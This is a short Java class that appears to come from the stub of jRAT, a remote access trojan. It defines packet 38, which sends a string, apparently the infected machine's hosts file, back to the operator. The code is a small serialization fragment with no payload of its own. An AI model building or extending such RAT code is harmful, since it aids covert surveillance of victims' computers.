package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;
import java.io.DataOutputStream;


public class Packet38HostFile extends AbstractOutgoingPacket {

	private String content;

	public Packet38HostFile(String content) {
		this.content = content;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(content);
	}

	@Override
	public short getPacketId() {
		return 38;
	}

}